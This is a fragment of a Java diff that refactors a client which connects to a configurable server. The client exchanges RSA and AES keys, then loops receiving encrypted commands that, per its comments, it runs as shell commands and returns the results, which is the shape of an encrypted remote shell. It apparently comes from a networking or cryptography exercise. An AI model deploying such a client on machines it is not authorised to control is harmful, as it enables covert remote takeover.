@@ -10,23 +10,36 @@ import java.security.spec.X509EncodedKeySpec;
 import java.util.Base64;
 
 public class ClientCommand {
+    private String serverAddress;
+    private int serverPort;
+    private DataInputStream input;
+    private DataOutputStream output;
 
-    public static void main(String[] args) {
-        try (Socket socket = new Socket("localhost", 8080)) {
-            DataInputStream input = new DataInputStream(socket.getInputStream());
-            DataOutputStream output = new DataOutputStream(socket.getOutputStream());
+    public ClientCommand(String serverAddress, int serverPort){
+        this.serverAddress = serverAddress;
+        this.serverPort = serverPort;
+    }
+
+    public void start() {
+        try (Socket socket = new Socket(serverAddress, serverPort)) {
+            System.out.println("Connect Successfully");
+            input = new DataInputStream(socket.getInputStream());
+            output = new DataOutputStream(socket.getOutputStream());
 
             // Nhận khóa công khai RSA từ Server
             String rsaPublicKeyString = input.readUTF();
+            System.out.println(rsaPublicKeyString);
             PublicKey rsaPublicKey = getPublicKeyFromString(rsaPublicKeyString);
 
             // Tạo khóa AES và mã hóa bằng khóa công khai RSA
             SecretKey aesKey = generateAESKey();
             String encryptedAesKey = encryptAESKey(aesKey, rsaPublicKey);
+            System.out.println("AES key: " + encryptedAesKey);
             output.writeUTF(encryptedAesKey);
 
             // Nhận lệnh từ Server, chạy lệnh shell và gửi kết quả
             while (true) {
+                System.out.println("In loop");
                 String encryptedCommand = input.readUTF();
                 String command = decryptCommand(encryptedCommand, aesKey);
                 if (command.isEmpty()) continue;
